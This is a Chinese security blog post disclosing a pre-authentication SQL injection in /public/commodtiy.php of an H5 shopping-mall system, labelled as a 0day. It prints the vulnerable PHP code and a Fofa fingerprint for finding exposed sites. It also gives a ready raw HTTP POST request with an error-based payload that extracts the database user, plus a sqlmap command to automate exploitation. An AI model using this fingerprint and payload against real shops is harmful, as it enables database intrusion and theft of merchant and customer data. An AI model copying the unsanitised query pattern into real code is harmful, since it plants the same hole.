#  某全新H5购物商城系统存在前台SQL注入漏洞   
原创 Mstir  星悦安全   2024-11-17 03:57  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**该源码采用HTML5技术开发，可以完美适配各种移动设备，以及iOS和Android系统。同时，易支付接口更为商家提供了便捷的交易功能，让顾客可以轻松通过手机进行网络支付，享受到更加便捷的购物体验。**  
  
**该源码界面设计十分简洁、清爽，同时还保证了购物流程的顺畅和简便。无论是主页、分类页面、商品详情页面，都给人留下了很好的第一印象。**  
  
**Fofa指纹:"/src/images/gg.png" && "/public/goods.php"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dgt3lS90YV5owichy0LsYwpTtyF3DnibTKM22xLLND31aLwT4ggLeZBwMbuIfzkRv7DATkQNSF7jzw/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dgt3lS90YV5owichy0LsYwpgXOQIkn0WH9U2A0VQSe23HtsEWY0U5eQwy0TiaDYxIVuGQCg1J4uYUw/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dgt3lS90YV5owichy0LsYwpNFZiau02Gm0tKAI6UhZOSOQ713tnzYbtJYiayicyvIGz7BArNbOoTShcw/640?wx_fmt=other&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
**位于 /public/commodtiy.php 文件中可以通过POST传入ddxq 来直接进入到SQL查询中，且未有任何过滤，导致漏洞产生.**  
```
<?php 
require($_SERVER['DOCUMENT_ROOT']."/config/database.php");
//查询商品sql
//首页推荐商品
$sysp=mysqli_query($link,"SELECT * FROM `sc_commodtiy` WHERE `spTj`='1' order by id desc");
//全部商品
$sp=mysqli_query($link,"SELECT * FROM `sc_commodtiy` order by id desc");
//查询用户订单流程
if($_POST['ddxq']){
    $dd=$_POST['ddxq'];
    $ddxq=mysqli_fetch_assoc(mysqli_query($link,"SELECT * FROM `sc_order` WHERE id='{$dd}'"));
    $order=array(
    "ddh"=>  $ddxq['danhao'],
    // "ifFh"=>$ddxq['ifFh'],
    );
    echo json_encode($order);
}
?>
```  
  
**Payload:**  
```
POST /public/commodtiy.php HTTP/1.1
Content-Length: 213
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

ddxq='||(SELECT 0x4776756d WHERE 3443=3443 AND (SELECT 9303 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dgt3lS90YV5owichy0LsYwplKoEVDmCBLh2WhmEhA09xD28ODnPENBoX8qclb0yMxP5mTZKmHpgrQ/640?wx_fmt=other&from=appmsg "")  
  
**Python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dgt3lS90YV5owichy0LsYwpIricwiaVIjcTEu4vqfkxJUeVuJDTDzlicsG0h2ETpFTKdX7O7IeApxcMQ/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**购物商城源码关注公众号发送 241117 获取!**  
  
  
  
  
**进星悦安全公开群添加下方VX 备注 "进群"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fr0w5NqA8l0xH4mcpTbkGK5v6wyHcicibH4ia14Wq1n0fPvn1C0QPAe98oVABtMWOA8nRPfHia0YqAFw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
